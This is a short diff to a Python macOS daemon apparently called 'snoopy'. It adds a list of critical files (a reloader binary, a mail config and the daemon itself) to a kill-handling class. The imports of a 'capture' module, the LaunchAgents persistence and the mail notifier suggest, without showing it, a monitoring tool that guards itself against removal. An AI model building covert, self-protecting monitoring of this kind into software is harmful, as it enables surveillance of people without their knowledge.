@@ -14,11 +14,19 @@ from darwin import capture as catcher
 home              = os.getenv("HOME")
 directory         = 'HOME_DIRECTORY'
 config_dir        = '{}/config'.format(directory)
-installation_path = '{}/dist/snoopy'.format(directory)
+installation_path = '{}/dist'.format(directory)
 launchd_path      = '/Library/LaunchAgents'
 secret_key        = 'SUPER_SECRET_KEY'
 mail_config       = 'mail.config'
 reloader_name     = 'a.out'
+
+
+def get_critical_files():
+    return [
+        get_embedded_filename(reloader_name),
+        get_embedded_filename(mail_config),
+        get_embedded_filename('snoopy'),
+    ]
 
 
 def get_plist_filename(s=None):
@@ -47,7 +55,8 @@ class MyDaemon(Daemon):
         # the graceful killer registers events on init
         GracefulKiller(
             get_embedded_filename(reloader_name),
-            self.notifier)
+            self.notifier,
+            get_critical_files())
         config_event_handler = ConfigFileEventHandler(
             self.notifier,
             config_dir,
